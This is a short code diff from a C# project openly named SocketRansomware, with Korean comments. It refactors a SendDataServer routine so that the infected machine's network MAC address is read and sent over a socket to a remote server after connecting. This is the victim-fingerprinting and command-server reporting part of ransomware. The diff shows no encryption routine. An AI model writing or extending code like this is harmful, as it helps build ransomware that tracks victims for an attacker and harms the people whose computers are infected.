@@ -40,7 +40,9 @@ namespace SocketRansomware
                 receiveMessageThread = new Thread(ReceiveMessage);
                 receiveMessageThread.IsBackground = true;
                 receiveMessageThread.Start();
-                SendDataServer();
+
+                string mac = "mac;" + NetworkInterface.GetAllNetworkInterfaces()[0].GetPhysicalAddress().ToString();
+                SendDataServer(mac);
              
             }
             catch (SocketException)
@@ -52,13 +54,10 @@ namespace SocketRansomware
                 MessageBox.Show("실패");
             }
         }
-       //서버로 컴퓨터 정보 전송
-        private void SendDataServer()
+       //서버로 데이터 전송
+        private void SendDataServer(string data)
         {
             byte[] buffer = new byte[1024];
-
-            //mac address
-            string str = "mac;" + NetworkInterface.GetAllNetworkInterfaces()[0].GetPhysicalAddress().ToString();
 
             try
             {
